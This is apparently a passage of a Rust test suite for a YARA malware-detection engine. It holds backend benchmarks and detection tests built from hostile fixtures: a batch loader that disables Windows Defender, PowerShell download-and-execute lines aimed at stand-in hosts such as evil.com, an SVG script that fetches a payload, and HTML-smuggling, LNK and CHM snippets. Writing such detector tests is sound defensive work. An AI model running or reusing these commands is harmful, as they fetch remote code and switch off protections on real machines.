            .expect("YARA_TEST_PACK_MANIFEST must name the generated manifest");
        let pack = RulePackLoad::load(std::path::Path::new(&manifest)).unwrap();
        let mut selected = None;
        for source in &pack.sources {
            if source.expected_rule_count < 100 || source.source.contains("import \"") {
                continue;
            }
            let yarax_started = Instant::now();
            let Ok(yarax) = compile_shard(
                "benchmark-yarax",
                &source.source,
                ScanTarget::Generic,
                RuleBackend::YaraX,
                &source.quality_tier,
                false,
            ) else {
                continue;
            };
            let yarax_compile = yarax_started.elapsed();
            if yarax.rule_count != source.expected_rule_count {
                continue;
            }
            let native_started = Instant::now();
            let native = compile_shard(
                "benchmark-native",
                &source.source,
                ScanTarget::Generic,
                RuleBackend::LibYara,
                &source.quality_tier,
                false,
            )
            .unwrap();
            let native_compile = native_started.elapsed();
            selected = Some((
                source.shard_id.clone(),
                yarax,
                native,
                yarax_compile,
                native_compile,
            ));
            break;
        }
        let (shard_id, yarax, native, yarax_compile, native_compile) =
            selected.expect("pack needs a 100+ rule shard supported by both backends");
        let fixture = vec![b' '; 100 * 1024];
        for _ in 0..5 {
            scan_compiled(
                &yarax.rules,
                &fixture,
                Duration::from_secs(5),
                &yarax.quality_tier,
            )
            .unwrap();
            scan_compiled(
                &native.rules,
                &fixture,
                Duration::from_secs(5),
                &native.quality_tier,
            )
            .unwrap();
        }
        let iterations = 100u32;
        let mut yarax_scan = Duration::ZERO;
        let mut native_scan = Duration::ZERO;
        for _ in 0..iterations {
            let started = Instant::now();
            let yarax_matches = scan_compiled(
                &yarax.rules,
                &fixture,
                Duration::from_secs(5),
                &yarax.quality_tier,
            )
            .unwrap();
            yarax_scan += started.elapsed();

            let started = Instant::now();
            let native_matches = scan_compiled(
                &native.rules,
                &fixture,
                Duration::from_secs(5),
                &native.quality_tier,
            )
            .unwrap();
            native_scan += started.elapsed();
            assert_eq!(
                yarax_matches
                    .iter()
                    .map(|matched| &matched.rule_name)
                    .collect::<HashSet<_>>(),
                native_matches
                    .iter()
                    .map(|matched| &matched.rule_name)
                    .collect::<HashSet<_>>()
            );
        }
        println!(
            "dual-backend benchmark shard={shard_id} rules={} bytes={} iterations={iterations} yarax_compile_ms={} native_compile_ms={} yarax_scan_avg_us={} native_scan_avg_us={}",
            yarax.rule_count,
            fixture.len(),
            yarax_compile.as_millis(),
            native_compile.as_millis(),
            yarax_scan.as_micros() / u128::from(iterations),
            native_scan.as_micros() / u128::from(iterations)
        );
    }

    #[test]
    fn test_eicar_detected() {
        let engine = YaraEngine::new().unwrap();
        let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        let matches = engine.scan(eicar);
        assert!(
            matches.iter().any(|m| m.rule_name == "EICAR_Test_File"),
            "Should detect EICAR test file, got: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_clean_text_no_match() {
        let engine = YaraEngine::new().unwrap();
        let clean = b"Hello, this is a normal business email about the quarterly report.";
        let matches = engine.scan(clean);
        assert!(matches.is_empty(), "Normal text should not match any rules");
    }

    #[test]
    fn test_batcloak_style_batch_loader_detected() {
        let engine = YaraEngine::new().unwrap();
        let sample = br#"@echo off
setlocal EnableDelayedExpansion
for /f %%i in ('whoami') do set user=%%i
call set stage=payload
powershell.exe -enc SQBFAFgA
certutil -decode a.txt b.bin
copy b.bin %TEMP%\dropper.exe
timeout /t 3
Set-MpPreference -DisableRealtimeMonitoring $true
sc stop WinDefend
start /b %TEMP%\dropper.exe
echo ^^done
"#;
        let matches = engine.scan(sample);
        assert!(
            matches
                .iter()
                .any(|m| m.rule_name == "Evasion_BatCloak_Obfuscated_Batch"),
            "Should detect BatCloak-style obfuscated batch loader, got: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn compound_delivery_rules_require_hostile_context() {
        let engine = YaraEngine::new().unwrap();

        let mut weaponized_lnk = vec![
            0x4c, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
        ];
        weaponized_lnk.extend_from_slice(
            b"cmd.exe /c powershell -encodedcommand SQBFAFgA https://evil.example/a",
        );
        let mut benign_lnk = weaponized_lnk[..20].to_vec();
        benign_lnk.extend_from_slice(b"C:\\Program Files\\Acme\\Acme.exe");

        let mut weaponized_chm = b"ITSF\x03\x00\x00\x00".to_vec();
        weaponized_chm.extend_from_slice(
            b"<OBJECT><PARAM name=Command value=ShortcutExec><PARAM name=Item1 value=cmd.exe /c calc>",
        );
        let mut benign_chm = b"ITSF\x03\x00\x00\x00".to_vec();
        benign_chm.extend_from_slice(b"<html><body>Product help documentation</body></html>");

        let smuggling = br#"<html><script>
const bytes = atob(payload); const blob = new Blob([bytes]);
const url = URL.createObjectURL(blob); link.download = "invoice.zip"; link.click();
</script></html>"#;
        let benign_html = br#"<html><script>const icon = atob("aWNvbg==");</script></html>"#;

        let hostile_rdp = b"screen mode id:i:2\nfull address:s:203.0.113.10\nauthentication level:i:0\nremoteapplicationprogram:s:||powershell\n";
        let benign_rdp = b"screen mode id:i:2\nfull address:s:rdp.corp.example\nauthentication level:i:2\nprompt for credentials:i:1\n";

        let benign_batch = b"@echo off\nsetlocal EnableDelayedExpansion\necho Quarterly backup\ncopy report.txt %TEMP%\\report.txt\n";

        for (rule, hostile, benign) in [
            (
                "Evasion_LNK_Command_Exec",
                weaponized_lnk.as_slice(),
                benign_lnk.as_slice(),
            ),
            (
                "Evasion_CHM_Delivery",
                weaponized_chm.as_slice(),
                benign_chm.as_slice(),
            ),
            (
                "Evasion_HTML_Smuggling",
                smuggling.as_slice(),
                benign_html.as_slice(),
            ),
            (
                "Evasion_RDP_Unsafe_RemoteApp_Profile",
                hostile_rdp.as_slice(),
                benign_rdp.as_slice(),
            ),
        ] {
            let hostile_matches = engine.scan(hostile);
            assert!(
                hostile_matches
                    .iter()
                    .any(|matched| matched.rule_name == rule),
                "hostile fixture should match {rule}: {:?}",
                hostile_matches
                    .iter()
                    .map(|matched| &matched.rule_name)
                    .collect::<Vec<_>>()
            );
            let benign_matches = engine.scan(benign);
            assert!(
                !benign_matches
                    .iter()
                    .any(|matched| matched.rule_name == rule),
                "benign control must not match {rule}: {:?}",
                benign_matches
                    .iter()
                    .map(|matched| &matched.rule_name)
                    .collect::<Vec<_>>()
            );
        }

        let benign_batch_matches = engine.scan(benign_batch);
        assert!(
            !benign_batch_matches
                .iter()
                .any(|matched| matched.rule_name == "Evasion_BatCloak_Obfuscated_Batch")
        );
    }

    #[test]
    fn powershell_download_exec_requires_one_local_command_context() {
        let engine = YaraEngine::new().unwrap();
        let local_chain =
            b"powershell.exe -ExecutionPolicy Bypass -c IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a')";
        let mut unrelated_blob = b"powershell documentation".to_vec();
        unrelated_blob.extend_from_slice(&vec![b'A'; 32 * 1024]);
        unrelated_blob.extend_from_slice(b"curl command reference");
        unrelated_blob.extend_from_slice(&vec![b'B'; 32 * 1024]);
        unrelated_blob.extend_from_slice(b"IEX stock symbol");
        let mut padded_evasion = b"powershell ".repeat(256);
        padded_evasion.extend_from_slice(&vec![b'C'; 32 * 1024]);
        padded_evasion.extend_from_slice(b"curl IEX");

        assert!(
            engine
                .scan(local_chain)
                .iter()
                .any(|matched| matched.rule_name == "PowerShell_Download_Exec"),
            "a local PowerShell download/execute chain must remain detected"
        );
        assert!(
            !engine
                .scan(&unrelated_blob)
                .iter()
                .any(|matched| matched.rule_name == "PowerShell_Download_Exec"),
            "unrelated words spread across a large MIME/Base64 blob must not form one command"
        );
        assert!(
            engine
                .scan(&padded_evasion)
                .iter()
                .any(|matched| matched.rule_name == "PowerShell_Download_Exec"),
            "launcher-token padding must not evade the bounded locality validator"
        );
    }

    #[test]
    fn family_names_alone_do_not_convict_random_encoded_or_compressed_bytes() {
        let engine = YaraEngine::new().unwrap();
        let lumma_coincidence = b"DKIM-Signature: b=AbCdEslummaQwErTyUiOp";
        let vidar_coincidence = b"Content-Transfer-Encoding: base64\r\nQUJDREVGR1ZpZGFySElKS0w=";
        let lumma_positive = b"LummaC2 Login Data CryptUnprotectData";
        let vidar_positive = b"Vidar Stealer HWID Login Data wallet.dat";

        for (rule, benign, hostile) in [
            (
                "Mal_Lumma_Stealer",
                lumma_coincidence.as_slice(),
                lumma_positive.as_slice(),
            ),
            (
                "Mal_Vidar_Stealer",
                vidar_coincidence.as_slice(),
                vidar_positive.as_slice(),
            ),
        ] {
            assert!(
                !engine
                    .scan(benign)
                    .iter()
                    .any(|matched| matched.rule_name == rule),
                "a bare family-name coincidence must not match {rule}"
            );
            assert!(
                engine
                    .scan(hostile)
                    .iter()
                    .any(|matched| matched.rule_name == rule),
                "compound family behavior must remain detectable for {rule}"
            );
        }
    }

    #[test]
    fn pdf_javascript_does_not_join_catalog_action_to_stream_coincidence() {
        let engine = YaraEngine::new().unwrap();
        let mut false_compound =
            b"%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\nstream\n".to_vec();
        false_compound.extend_from_slice(&vec![0xA5; 256 * 1024]);
        false_compound.extend_from_slice(b"/JS\nendstream\n%%EOF");
        let positive =
            b"%PDF-1.7\n1 0 obj << /S /JavaScript /JS (app.alert('review')) >> endobj\n%%EOF";

        assert!(
            !engine
                .scan(&false_compound)
                .iter()
                .any(|matched| matched.rule_name == "PDF_JavaScript"),
            "catalog /OpenAction plus a chance /JS in stream bytes is not JavaScript evidence"
        );
        assert!(
            engine
                .scan(positive)
                .iter()
                .any(|matched| matched.rule_name == "PDF_JavaScript"),
            "a real PDF JavaScript entry with an executable API must remain detected"
        );
    }

    #[test]
    fn svg_rules_require_standalone_svg_document_context() {
        let engine = YaraEngine::new().unwrap();
        let benign_html = br#"<!DOCTYPE html><html><body>
<svg viewBox="0 0 16 16"><path d="M1 1h4v4z"/></svg>
<script>
const templateBase64 = "UEsDBAoAAAAA";
const workbook = XLSX.read(window.atob(templateBase64), {type: "binary"});
</script></body></html>"#;
        let malicious_svg = br#"<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>const p=atob("cGF5bG9hZA==");fetch("https://malicious.example/p");</script>
</svg>"#;

        let target_rules = ["Doc_SVG_Base64_Smuggle", "Evasion_SVG_Script_Exec"];
        let benign_matches = engine.scan(benign_html);
        for rule in target_rules {
            assert!(
                !benign_matches
                    .iter()
                    .any(|matched| matched.rule_name == rule),
                "an inline icon and unrelated XLSX decoder must not match {rule}: {:?}",
                benign_matches
                    .iter()
                    .map(|matched| &matched.rule_name)
                    .collect::<Vec<_>>()
            );
        }

        let malicious_matches = engine.scan(malicious_svg);
        for rule in target_rules {
            assert!(
                malicious_matches
                    .iter()
                    .any(|matched| matched.rule_name == rule),
                "standalone scripted SVG must still match {rule}: {:?}",
                malicious_matches
                    .iter()
                    .map(|matched| &matched.rule_name)
                    .collect::<Vec<_>>()
            );
        }
    }

    #[test]
    fn test_icedid_rule_ignores_pdf_lure_content() {
        let engine = YaraEngine::new().unwrap();
        let benign_pdf = b"%PDF-1.7\nIcedID research note\nJFIF\n\x1F\x8B\x08\nMZ\n";
        let matches = engine.scan(benign_pdf);
        assert!(
            !matches.iter().any(|m| m.rule_name == "Mal_IcedID_BokBot"),
            "PDF lure content should not match IcedID rule: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_icedid_rule_still_matches_binary_style_payload() {
        let engine = YaraEngine::new().unwrap();
        let payload =
            b"MZ\x90\x00PE\x00\x00IcedID InternetOpenA InternetConnectA NtCreateSection HttpSendRequestW";
        let matches = engine.scan(payload);
        assert!(
            matches.iter().any(|m| m.rule_name == "Mal_IcedID_BokBot"),
            "Binary-style IcedID indicators should still match: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_icedid_rule_ignores_random_signatures_in_jpeg_stream() {
        let engine = YaraEngine::new().unwrap();
        let sample = b"JFIF\x00photo data\x1f\x8b\x08compressed MZ bytes without a PE header";
        let matches = engine.scan(sample);
        assert!(
            !matches.iter().any(|m| m.rule_name == "Mal_IcedID_BokBot"),
            "random JPEG/gzip/MZ signatures must not match IcedID: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn pe_in_document_ignores_isolated_magic_bytes_in_pdf_stream() {
        let engine = YaraEngine::new().unwrap();
        let sample = b"%PDF-1.7\nstream\ncompressed MZ bytes and PE\x00\x00 bytes\nendstream\n";
        let matches = engine.scan(sample);
        assert!(
            !matches
                .iter()
                .any(|m| m.rule_name == "PE_In_Container_Structural_Candidate"),
            "isolated magic bytes in a PDF stream must not be treated as an embedded PE: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn pe_in_document_requires_a_valid_dos_to_pe_header_chain() {
        let engine = YaraEngine::new().unwrap();
        let mz_offset = 32usize;
        let pe_offset = 0x40usize;
        let mut sample = b"%PDF-1.7\n".to_vec();
        sample.resize(mz_offset + pe_offset + 4, 0);
        sample[mz_offset] = b'M';
        sample[mz_offset + 1] = b'Z';
        sample[mz_offset + 0x3c..mz_offset + 0x40]
            .copy_from_slice(&(pe_offset as u32).to_le_bytes());
        sample[mz_offset + pe_offset..mz_offset + pe_offset + 4].copy_from_slice(b"PE\0\0");

        let matches = engine.scan(&sample);
        assert!(
            matches
                .iter()
                .any(|m| m.rule_name == "PE_In_Container_Structural_Candidate"),
            "a valid embedded DOS/PE header chain should be detected: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
        let candidate = matches
            .iter()
            .find(|m| m.rule_name == "PE_In_Container_Structural_Candidate")
            .expect("candidate metadata");
        assert_eq!(candidate.severity, "low");
        assert_eq!(candidate.fidelity, "hunting");
        assert!(!candidate.breaker_eligible);
    }

    #[test]
    fn pdf_embedded_file_without_auto_action_is_not_flagged() {
        let engine = YaraEngine::new().unwrap();
        let benign_pdf = b"%PDF-1.7\n/Names << /EmbeddedFiles 42 0 R >>\n/Type /EmbeddedFile\nstream\nMZ is ordinary compressed-stream data\nendstream\n";
        let matches = engine.scan(benign_pdf);
        assert!(
            !matches.iter().any(|m| m.rule_name == "PDF_EmbeddedFile"),
            "Embedded files without automatic actions should be allowed: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn pdf_embedded_file_with_auto_action_is_detected() {
        let engine = YaraEngine::new().unwrap();
        let suspicious_pdf =
            b"%PDF-1.7\n/Names << /EmbeddedFiles 42 0 R >>\n/EmbeddedFile /OpenAction\n";
        let matches = engine.scan(suspicious_pdf);
        assert!(
            matches.iter().any(|m| m.rule_name == "PDF_EmbeddedFile"),
            "Embedded file with an automatic action should be detected: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_elf_header_detected() {
        let engine = YaraEngine::new().unwrap();
        let elf_data = vec![0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00];
        let matches = engine.scan(&elf_data);
        assert!(
            matches.iter().any(|m| m.rule_name == "ELF_In_Attachment"),
            "Should detect ELF binary, got: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_powershell_download_detected() {
        let engine = YaraEngine::new().unwrap();
        let ps_script = b"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\"";
        let matches = engine.scan(ps_script);
        assert!(
            matches.iter().any(|m| m.category == "webshell"),
            "Should detect PowerShell downloader, got: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_yarax_module_compatibility() {
        // Verify yara-x 1.14 Module
        let module_tests = vec![
            (
                "pe.imports",
                r#"import "pe" rule t { condition: pe.imports("kernel32.dll") }"#,
            ),
            (
                "pe.sections",
                r#"import "pe" rule t { condition: pe.number_of_sections > 0 }"#,
            ),
            (
                "math.entropy",
                r#"import "math" rule t { condition: math.entropy(0, filesize) > 7.0 }"#,
            ),
            ("lnk", r#"import "lnk" rule t { condition: lnk.is_lnk }"#),
            (
                "dotnet",
                r#"import "dotnet" rule t { condition: dotnet.is_dotnet }"#,
            ),
            (
                "elf",
                r#"import "elf" rule t { condition: elf.type == elf.ET_EXEC }"#,
            ),
            (
                "hash",
                r#"import "hash" rule t { strings: $a = "t" condition: $a and hash.md5(0, filesize) == "x" }"#,
            ),
            (
                "macho",
                r#"import "macho" rule t { condition: macho.MH_EXECUTE > 0 }"#,
            ),
            ("uint16", r#"rule t { condition: uint16(0) == 0x5A4D }"#),
            ("filesize", r#"rule t { condition: filesize < 1000 }"#),
            (
                "basic_strings",
                r#"rule t { strings: $a = "test" condition: $a }"#,
            ),
            (
                "hex_strings",
                r#"rule t { strings: $h = { 4D 5A 90 00 } condition: $h }"#,
            ),
            (
                "regex",
                r#"rule t { strings: $r = /[a-z]{3,10}/ condition: $r }"#,
            ),
        ];
        println!("\n=== yara-x module compatibility ===");
        for (name, src) in &module_tests {
            let mut c = yara_x::Compiler::new();
            match c.add_source(*src) {
                Ok(_) => println!("  OK  {}", name),
                Err(e) => println!("FAIL  {}: {}", name, e),
            }
        }
        println!("===================================\n");
    }

    #[test]
    fn test_yarax_rsa_backed_modules_are_disabled() {
        let mut compiler = yara_x::Compiler::new();
        let result = compiler.add_source(
            r#"import "pe" rule crypto_module_must_stay_disabled { condition: pe.is_pe }"#,
        );

        assert!(
            result.is_err(),
            "PE/CRX/Mach-O crypto modules must stay disabled so YARA-X cannot reintroduce the vulnerable rsa crate"
        );
    }

    #[test]
    fn test_match_has_metadata() {
        let engine = YaraEngine::new().unwrap();
        let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        let matches = engine.scan(eicar);
        let m = matches
            .iter()
            .find(|m| m.rule_name == "EICAR_Test_File")
            .expect("EICAR should match");
        assert_eq!(m.category, "malware_family");
        assert_eq!(m.severity, "critical");
        assert_eq!(m.fidelity, "exact");
        assert!(m.breaker_eligible);
        assert!(!m.description.is_empty());
    }

    #[test]
    fn test_pdf_javascript_with_prefix_junk_detected() {
        // PoC bypass: ISO 32000 allows %PDF anywhere in the first 1024 bytes;
        // prefix junk previously defeated `$pdf at 0` anchoring.
        let engine = YaraEngine::new().unwrap();
        let mut sample = vec![b'J'; 64];
        sample.extend_from_slice(
            b"%PDF-1.7\n<< /OpenAction << /S /JavaScript /JS (eval(app.alert('x'))) >> >>\n",
        );
        let matches = engine.scan(&sample);
        assert!(
            matches.iter().any(|m| m.rule_name == "PDF_JavaScript"),
            "prefix-junk PDF with JavaScript should match, got: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_pdf_header_beyond_window_does_not_anchor() {
        // The 1024-byte window is bounded: a %PDF header past byte 1024 must
        // not satisfy the PDF anchor (keeps the IcedID PDF-lure exclusion
        // and text mentions from being treated as PDFs).
        let engine = YaraEngine::new().unwrap();
        let mut sample = vec![b'j'; 1100];
        sample.extend_from_slice(
            b"%PDF-1.7\n<< /OpenAction << /S /JavaScript /JS (eval(app.alert('x'))) >> >>\n",
        );
        let matches = engine.scan(&sample);
        assert!(
            !matches.iter().any(|m| m.rule_name == "PDF_JavaScript"),
            "PDF header beyond the 1024-byte window must not anchor: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_rtf_ole_object_with_leading_whitespace_detected() {
        // PoC bypass: whitespace before {\rtf is legal and previously
        // defeated `$rtf at 0` anchoring.
        let engine = YaraEngine::new().unwrap();
        let sample = b"\r\n\t {\\rtf1\\ansi{\\object\\objdata d0cf11e0a1b11ae1}}";
        let matches = engine.scan(sample);
        assert!(
            matches.iter().any(|m| m.rule_name == "RTF_OLE_Object"),
            "whitespace-prefixed RTF OLE object should match, got: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_rtf_ole_object_at_offset_zero_unchanged() {
        let engine = YaraEngine::new().unwrap();
        let sample = b"{\\rtf1\\ansi{\\object\\objdata d0cf11e0a1b11ae1}}";
        let matches = engine.scan(sample);
        assert!(
            matches.iter().any(|m| m.rule_name == "RTF_OLE_Object"),
            "offset-0 RTF OLE object should still match, got: {:?}",
            matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
        );
    }
}
